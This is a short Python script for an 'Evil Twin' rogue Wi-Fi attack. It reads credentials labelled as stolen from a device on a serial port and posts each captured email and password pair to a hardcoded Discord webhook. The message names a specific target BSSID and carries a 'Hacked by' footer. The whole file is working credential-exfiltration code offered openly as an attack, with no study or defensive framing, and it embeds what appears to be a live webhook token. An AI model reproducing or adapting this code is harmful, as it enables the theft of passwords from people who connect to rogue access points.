import serial
import requests
import json

# Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1466450537057615923/ZHjR5aI1VDQzpNcpK0eGjBuvs1V3juMT9xNVtFIe0U4VRboAH6JqjTFru0r-VYZPTY4w"

try:
    ser = serial.Serial('COM6', 115200, timeout=1)
    print("📡 Monitoring Evil Twin for credentials...")
except:
    print("❌ Could not open COM port. Check connection.")

email = None
password = None

while True:
    line = ser.readline().decode('utf-8', errors='ignore').strip()
    
    # Capture email/username
    if "STOLEN Email:" in line:
        email = line.split("STOLEN Email: ")[1]
        print(f"📧 Captured Email: {email}")
    
    # Capture password
    elif "STOLEN PASSWORD:" in line:
        password = line.split("STOLEN PASSWORD: ")[1]
        print(f"🔑 Captured Password: {password}")
        
        # Only send notification when both are captured
        if email and password:
            data = {
                "embeds": [{
                    "title": "💀 EVIL TWIN CAPTURE",
                    "color": 2282478,
                    "fields": [
                        {"name": "Target BSSID", "value": "E8:65:D4:99:5D:F8", "inline": True},
                        {"name": "Email", "value": f"**{email}**", "inline": True},
                        {"name": "Password", "value": f"**{password}**", "inline": True}
                    ],
                    "footer": {"text": "Exfiltrated by Evil Twin Attack Hacked by DCEKKA"}
                }]
            }
            requests.post(WEBHOOK_URL, data=json.dumps(data), headers={"Content-Type": "application/json"})
            print(f"✅ Success! Credentials exfiltrated to Discord.")
            
            # Reset variables for next capture
            email = None
            password = None